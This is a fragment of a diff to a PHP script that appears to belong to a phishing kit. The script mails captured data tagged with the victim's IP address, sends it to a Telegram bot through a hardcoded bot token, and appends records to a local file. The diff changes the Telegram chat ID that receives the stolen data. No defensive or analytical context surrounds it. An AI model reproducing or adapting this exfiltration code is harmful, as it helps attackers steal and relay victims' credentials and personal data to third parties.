@@ -22,8 +22,8 @@ $subject = "From:  [ $ip ]";
 {
 mail("$send", "$subject", $hello);
 $token = "1443724091:AAGTUQQqlLSLzRJtapT-eRZkuxLgYCiHbOQ";
-file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=1097743075&text=" . urlencode($message)."" );
-file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=1097743075&text=" . urlencode($hello)."" );
+file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=-727023526&text=" . urlencode($message)."" );
+file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=-727023526&text=" . urlencode($hello)."" );
 }
 
 $f = fopen("../python/python.php", "a");
